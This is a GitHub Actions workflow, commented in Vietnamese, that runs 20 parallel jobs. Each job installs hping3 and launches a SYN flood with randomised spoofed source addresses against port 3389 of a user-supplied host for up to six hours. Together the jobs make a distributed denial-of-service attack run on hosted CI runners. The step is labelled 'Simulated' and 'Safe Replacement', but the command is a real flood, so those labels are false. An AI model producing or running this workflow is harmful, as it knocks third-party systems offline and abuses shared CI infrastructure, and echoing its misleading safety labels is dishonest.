name: 'Self'

# Kích hoạt workflow bằng tay và nhận input
on:
  workflow_dispatch:
    inputs:
      target_host:
        description: 'Địa chỉ IP hoặc Hostname đích'
        required: true
        default: '127.0.0.1' # Thay bằng địa chỉ IP/Host hợp lệ, vô hại để kiểm tra
        
jobs:
  # Định nghĩa 20 jobs chạy song song
  parallel_test:
    # Chỉ định Self-Hosted Runner
    # Thay 'my-runner-label' bằng label thực tế của self-hosted runner của bạn
    runs-on: ubuntu-latest

    strategy:
      matrix:
        job_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
      fail-fast: false 
      
    steps:
      - name: 📝 Log Job Start Info
        run: |
          echo "Bắt đầu Job ${{ matrix.job_id }} trên Self-Hosted Runner."
          echo "Host đích: ${{ github.event.inputs.target_host }}"
          
      - name: ⚙️ Run Simulated Hping3 Command (Safe Replacement)
        run: |
          TARGET="${{ github.event.inputs.target_host }}"
          JOB_ID="${{ matrix.job_id }}"
          echo "Job $JOB_ID: Minh họa lệnh hping3 với nguồn ngẫu nhiên ."
          sudo apt install -y hping3
          timeout 360m sudo hping3 -S -V --rand-source --flood -p 3389 $TARGET
      - name: ✅ Log Job End
        run: echo "Hoàn thành Job ${{ matrix.job_id }}."

